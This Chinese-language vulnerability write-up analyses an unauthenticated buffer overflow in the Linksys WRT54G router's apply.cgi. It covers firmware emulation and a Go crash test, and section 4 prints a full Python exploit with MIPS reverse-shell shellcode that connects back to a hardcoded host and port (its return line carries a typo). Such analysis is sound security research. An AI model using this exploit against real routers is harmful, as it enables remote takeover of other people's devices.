# Linksys WRT54G路由器溢出漏洞分析

## 1\. 漏洞介绍

该漏洞存在于WRT54G路由器Web服务程序HTTPD的apply.cgi处理脚本中，由于对发送的POST数据没有进行有效的长度校验，当未经认证的远程攻击者想路由器的apply.cgi页面发送内容长度超过大于1000字节的POST请求时，就可以触发缓冲区溢出。

固件版本 **WRT54GV3.1_4.00.7**

下载地址 https://gitee.com/xj96/router-firmware/raw/master/linksys_wrt54gv2_fw4007.zip

## 2\. 漏洞分析

### 2.1 固件分析

解压固件

![image](https://image.3001.net/images/20210819/1629360874_611e12ea7819b4c9fc0c3.png!small)

定位漏洞程序httpd

![image](https://image.3001.net/images/20210819/1629360982_611e1356338793bac5824.png!small)

### 2.2 修复漏洞环境

### 模拟运行程序出现报错

![image](https://image.3001.net/images/20210819/1629361013_611e1375046b086fbe646.png!small)

通过逆向得知，执行的web应用程序试图采用NVRAM中的信息来配置参数，由于找不到/dev/nvram导致了错误的信息。

#### 2.2.1 修复NVRAM报错

参考 **揭秘家用路由器0day漏洞挖掘技术**

工具 zcutlip修复NVRAM

下载地址 https://github.com/zcutlip/nvram-faker.git

 **01 修改nvram-faker.c**

    
    
    ...
    int fork(void)
    {
        return 0;
    }
    char *get_mac_from_ip(const char *ip)
    {
        char mac[] = "00:50:56:C0:00:08";
        char *rmac = strdup(mac);
        return rmac;
    }
    

**02 修改nvram-faker.h**

    
    
    char *get_mac_from_ip(const char *ip);
    int fork(void);
    

**03 编译libnvram.so**

 **注意！！！**

交叉编译一般可以直接到厂商GPL Source去找，如果有GPL Source的话，里面就会包含交叉编译工具

这边十分感谢cq师傅的建议^-^

搜索对应GPL Source

![image](https://image.3001.net/images/20210819/1629361039_611e138fa428a8cf31583.png!small)

选择指定型号GPL Source

![image](https://image.3001.net/images/20210819/1629361056_611e13a084e190fd677a6.png!small)

经测试该版本gcc编译出来的libnvram-faker.so报错，原因应该是版本过高导致

![image](https://image.3001.net/images/20210819/1629361066_611e13aa4ee2615c81ea8.png!small)

buildroot 工具编译较老版本gcc

下载地址 https://github.com/buildroot.git

运行成功版本 **buildroot-2018.11.2**

![image](https://image.3001.net/images/20210819/1629361078_611e13b65b6db620658e3.png!small)

修改nvram-faker目录下buildmipsel.sh

    
    
    #!/bin/sh
    
    export ARCH=mipsel
    TARGET=$1
    
    # Sets up toolchain environment variables for various mips toolchain
    
    warn()
    {
    	echo "$1" >&2
    }
    
    export CC=/home/iot/Desktop/tool/WRT54GL-US_v4.30.18.006/tools/brcm/hndtools-mipsel-linux-3.2.3/bin/mipsel-linux-gcc #指定gcc位置
    export LD=/home/iot/Desktop/tool/WRT54GL-US_v4.30.18.006/tools/brcm/hndtools-mipsel-linux-3.2.3/bin/mipsel-linux-ld #指定ld位置
    export AR=/home/iot/Desktop/tool/WRT54GL-US_v4.30.18.006/tools/brcm/hndtools-mipsel-linux-3.2.3/bin/mipsel-linux-ar #指定ar位置
    export STRIP=/home/iot/Desktop/tool/WRT54GL-US_v4.30.18.006/tools/brcm/hndtools-mipsel-linux-3.2.3/bin/mipsel-linux-strip #指定strip位置
    export NM=/home/iot/Desktop/tool/WRT54GL-US_v4.30.18.006/tools/brcm/hndtools-mipsel-linux-3.2.3/bin/mipsel-linux-nm #指定nm位置
    
    make $TARGET || exit $?
    

编译

    
    
    $ ./buildmipsel.sh
    

![image](https://image.3001.net/images/20210819/1629361094_611e13c6e7c543c1090cf.png!small)

#### 2.2.2 修复其他问题

/var/run/httpd.pid:no such file or directory

通过程序逆向可知，HTTPD运行时需要对var目录下的某些文件进行操作。

参考 **揭秘家用路由器0day漏洞挖掘技术 - prepare.sh**

    
    
    #!/bin/bash
    
    rm -f var
    mkdir var
    mkdir ./var/run
    mkdir ./var/tmp
    touch ./var/run/lock
    touch ./var/run/crod.pid
    

#### 2.2.3 模拟运行程序

HOOK动态库

    
    
    $ sudo chroot . ./qemu-mipsel-static -E LD_PRELOAD="/libnvram-faker.so" -g 1234 ./usr/sbin/httpd
    

![image](https://image.3001.net/images/20210819/1629361117_611e13dd59f0f18c82b28.png!small)

### 2.3 漏洞成因分析

测试程序

    
    
    package main
    
    import (
    	"fmt"
    	"io/ioutil"
    	"net/http"
    	"strings"
    )
    
    var letterRunes = []rune("AB")
    
    func randString(n, index int) string {
    	b := make([]rune, n)
    	for i := range b {
    		b[i] = letterRunes[index]
    	}
    
    	return string(b)
    }
    
    func main() {
    	target := "192.168.72.129:80"
    	domain := fmt.Sprintf("http://%s/apply.cgi", target)
    
    	data := randString(10000, 0) + randString(12288, 1)
    
    	client := &http.Client{}
    
    	req, err := http.NewRequest("POST", domain, strings.NewReader(data))
    	if err != nil {
    		fmt.Println(err.Error())
    		return
    	}
    
    	resp, err := client.Do(req)
    
    	if err != nil {
    		fmt.Println(err.Error())
    		return
    	}
    
    	body, err := ioutil.ReadAll(resp.Body)
    	if err != nil {
    		fmt.Println(err.Error())
    		return
    	}
    
    	fmt.Println(string(body))
    	fmt.Println("Status Code:", resp.StatusCode)
    
    }
    

可以看到HTTP程序出现崩溃

![image](https://image.3001.net/images/20210819/1629361133_611e13ede3c311879bf82.png!small)

![image](https://image.3001.net/images/20210819/1629361176_611e1418debf145bab6d3.png!small)

将0写入$at寄存器时造成错误，原因时系统无法找到0x42429952这块内存，0x42424242是测试程序发送的脏数据,post_buf长度为0x5710是发送脏数据的长度。

#### 2.3.1 定位漏洞位置

根据报错位置，可以定位到漏洞函数(0x00411288)

![image](https://image.3001.net/images/20210819/1629361194_611e142a311a77ccba844.png!small)

反编译

![image](https://image.3001.net/images/20210819/1629361220_611e14444f1e591f460fa.png!small)

读取长度为content_length长度的数据存储到post_buf中，读取的长度不为0，计算post_buf数据的长度。

出现问题的地方就在调用do_apply_post函数时并没有对content-length数据进行校验，而该长度在读取数据进入内存时也没有进行校验就直接读取post数据，因此导致了缓冲区溢出。

查看post_buf数据位置,可以看到post_buf只有10000字节

![image](https://image.3001.net/images/20210819/1629361240_611e145811ef7030337fc.png!small)

直接超过10000字节的数据全部复制到post_buf中，直接导致了缓冲区溢出。

## 3\. 漏洞利用

经过分析我们可以发现缓冲区的数据覆盖.data段的全局变量。可以通过覆盖.extren段中strlen函数的地址，实现执行shellcode的目的。

![image](https://image.3001.net/images/20210819/1629361254_611e14662de80b00ff7bb.png!small)

strlen函数位置(0x1000D0F0)

![image](https://image.3001.net/images/20210819/1629361267_611e1473d744d7ff2f6d2.png!small)

计算需要填充的数据

0x1000D0F0 - 0x10001AD8 = 0xB618(46616)

为了能够最大限度的执行shellcode，我们将post_buf之后0x4000字节的全部数据覆盖为post_buf首地址。

利用方法

![image](https://image.3001.net/images/20210819/1629361310_611e149e3a2a8b6f44aef.png!small)

## 4\. 漏洞测试

参考 **揭秘家用路由器0day漏洞挖掘技术 - wrt54g_POC.py**

    
    
    #!/usr/bin/env python
     
    import sys
    import struct,socket
    import urllib2
    
    def makepayload(host,port):
        print '[*] prepare shellcode',
        hosts = struct.unpack('<cccc',struct.pack('<L',host))
        ports = struct.unpack('<cccc',struct.pack('<L',port))
    
        #print hosts,ports
    
        # sys_socket
        # a0: domain
        # a1: type
        # a2: protocol
        mipselshell ="\xfa\xff\x0f\x24"   # li t7,-6
        mipselshell+="\x27\x78\xe0\x01"   # nor t7,t7,zero
        mipselshell+="\xfd\xff\xe4\x21"   # addi a0,t7,-3
        mipselshell+="\xfd\xff\xe5\x21"   # addi a1,t7,-3
        mipselshell+="\xff\xff\x06\x28"   # slti a2,zero,-1
        mipselshell+="\x57\x10\x02\x24"   # li v0,4183 # sys_socket
        mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
    
        # sys_connect
        # a0: sockfd (stored on the stack)
        # a1: addr (data stored on the stack)
        # a2: addrlen
        mipselshell+="\xff\xff\xa2\xaf"   # sw v0,-1(sp)
        mipselshell+="\xff\xff\xa4\x8f"   # lw a0,-1(sp)
        mipselshell+="\xfd\xff\x0f\x34"   # li t7,0xfffd
        mipselshell+="\x27\x78\xe0\x01"   # nor t7,t7,zero
        mipselshell+="\xe2\xff\xaf\xaf"   # sw t7,-30(sp)
        mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\x0e\x3c"   # lui t6,0x1f90
        mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\xce\x35"   # ori t6,t6,0x1f90
        mipselshell+="\xe4\xff\xae\xaf"   # sw t6,-28(sp)
        mipselshell+=struct.pack('<2c',hosts[1],hosts[0]) + "\x0e\x3c"   # lui t6,0x7f01
        mipselshell+=struct.pack('<2c',hosts[3],hosts[2]) + "\xce\x35"   # ori t6,t6,0x101
        mipselshell+="\xe6\xff\xae\xaf"   # sw t6,-26(sp)
        mipselshell+="\xe2\xff\xa5\x27"   # addiu a1,sp,-30
        mipselshell+="\xef\xff\x0c\x24"   # li t4,-17
        mipselshell+="\x27\x30\x80\x01"   # nor a2,t4,zero
        mipselshell+="\x4a\x10\x02\x24"   # li v0,4170  # sys_connect
        mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
        # sys_dup2
        # a0: oldfd (socket)
        # a1: newfd (0, 1, 2)
        mipselshell+="\xfd\xff\x11\x24"   # li s1,-3
        mipselshell+="\x27\x88\x20\x02"   # nor s1,s1,zero
        mipselshell+="\xff\xff\xa4\x8f"   # lw a0,-1(sp)
        mipselshell+="\x21\x28\x20\x02"   # move a1,s1 # dup2_loop
        mipselshell+="\xdf\x0f\x02\x24"   # li v0,4063 # sys_dup2
        mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
        mipselshell+="\xff\xff\x10\x24"   # li s0,-1
        mipselshell+="\xff\xff\x31\x22"   # addi s1,s1,-1
        mipselshell+="\xfa\xff\x30\x16"   # bne s1,s0,68 <dup2_loop>
        # sys_execve
        # a0: filename (stored on the stack) "//bin/sh"
        # a1: argv "//bin/sh"
        # a2: envp (null)
        mipselshell+="\xff\xff\x06\x28"   # slti a2,zero,-1
        mipselshell+="\x62\x69\x0f\x3c"   # lui t7,0x2f2f "bi"
        mipselshell+="\x2f\x2f\xef\x35"   # ori t7,t7,0x6269 "//"
        mipselshell+="\xec\xff\xaf\xaf"   # sw t7,-20(sp)
        mipselshell+="\x73\x68\x0e\x3c"   # lui t6,0x6e2f "sh"
        mipselshell+="\x6e\x2f\xce\x35"   # ori t6,t6,0x7368 "n/"
        mipselshell+="\xf0\xff\xae\xaf"   # sw t6,-16(sp)
        mipselshell+="\xf4\xff\xa0\xaf"   # sw zero,-12(sp)
        mipselshell+="\xec\xff\xa4\x27"   # addiu a0,sp,-20
        mipselshell+="\xf8\xff\xa4\xaf"   # sw a0,-8(sp)
        mipselshell+="\xfc\xff\xa0\xaf"   # sw zero,-4(sp)
        mipselshell+="\xf8\xff\xa5\x27"   # addiu a1,sp,-8
        mipselshell+="\xab\x0f\x02\x24"   # li v0,4011 # sys_execve
        mipselshell+="\x0c\x01\x01\x01"  # syscall 0x40404
        print 'ending ...'
        return mipselshel
    try:
        target = sys.argv[1]
    except:
        print "Usage: %s <target>" % sys.argv[0]
        sys.exit(1)
    
    url = "http://%s/apply.cgi" % target
    sip='192.168.72.129'     #reverse_tcp local_ip
    sport = 4444            #reverse_tcp local_port
    DataSegSize = 0x4000
    host=socket.ntohl(struct.unpack('<I',socket.inet_aton(sip))[0])
    payload = makepayload(host,sport)
    addr = struct.pack("<L",0x10001AD8)
    DataSegSize = 0x4000
    buf = "\x00"*(10000-len(payload))+payload+addr*(DataSegSize/4)
    req = urllib2.Request(url, buf)
    print urllib2.urlopen(req).read()
    

运行结果

![image](https://image.3001.net/images/20210819/1629361353_611e14c9ed53509d78180.png!small)

## 总结

本次实验在模拟程序运行上遇到不少的麻烦，可以看到不同设备不同厂商或多或少存在差异，需要我们有调试不同设备的调试能力。

## 参考

> <<揭秘家用路由器0day漏洞挖掘技术>>

